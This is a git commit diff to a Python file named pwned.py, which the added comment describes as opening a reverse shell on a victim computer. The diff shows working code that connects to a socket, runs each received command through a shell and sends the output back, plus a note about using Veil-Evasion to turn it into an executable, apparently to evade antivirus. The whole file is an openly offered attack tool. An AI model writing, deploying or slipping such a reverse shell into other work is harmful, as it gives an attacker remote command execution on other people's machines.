203063ffa1551b470bf861ec78320e7927a5523b
Ben <benjaminhunter@gmail.com>
2017-05-21 22:23:29 -0500

    pwned.py comment and removed unused code
    Signed-off-by: Ben <code@benhunter.me>

--- pwned.py
+++ pwned.py
@@ -1,3 +1,5 @@
+# Open a reverse shell when executed on a victim computer.
+
 import socket
 import subprocess
 
@@ -6,18 +8,11 @@ sockobj.connect(("127.0.0.1", 31337))
 
 while 1:
     data = sockobj.recv(4096)  # returns a bytes object
-    # print(data)
-    # print(type(data))
-    # print(str(data))
-    # print(data.decode())
-    # print(isinstance(str(data), str))
 
     # don't forget to decode the bytes to str
     proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                             stderr=subprocess.PIPE)
     result = proc.stdout.read()
-    # print("Command result:")
-    # print(result)
     sockobj.send(result)
 
 # Veil-Evasion make .py to .exe
